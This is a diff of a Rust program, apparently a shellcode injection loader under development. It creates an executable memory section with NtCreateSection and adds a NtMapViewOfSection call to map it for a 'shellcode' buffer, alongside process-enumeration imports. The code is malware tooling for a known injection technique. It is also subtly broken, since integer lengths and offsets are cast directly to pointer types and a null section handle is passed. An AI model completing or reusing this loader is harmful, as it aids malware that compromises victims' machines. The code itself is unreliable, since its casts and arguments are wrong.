@@ -1,4 +1,7 @@
-use ntapi::ntmmapi::NtCreateSection;
+use std::ptr;
+use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection};
+use winapi::{um::winnt::PLARGE_INTEGER, shared::basetsd::PSIZE_T};
+use winapi::um::processthreadsapi::GetCurrentProcess;
 use std::convert::TryFrom;
 use sysinfo::{ProcessExt, System, SystemExt};
 
@@ -71,13 +74,27 @@ fn main() {
             ptr::null_mut(),
             0xe,
             ptr::null_mut(),
-            shellcode.len() as u64,
+            shellcode.len() as PLARGE_INTEGER,
             0x40,
             0x08000000,
             ptr::null_mut(),
         );
         println!("NtCreateSection result {}", create_section_status);
 
-    }
+        let local_section_offset: u32 = 0;
+        let create_viewsection_status:i32 = NtMapViewOfSection(
+            ptr::null_mut(),
+            GetCurrentProcess(),
+            ptr::null_mut(),
+            0,
+            0,
+            local_section_offset as PLARGE_INTEGER,
+            shellcode.len() as PSIZE_T,
+            0x2,
+            0,
+            0x04
+        );
+        println!("NtMapViewOfSection result {}", create_viewsection_status);
 
+    }
 }
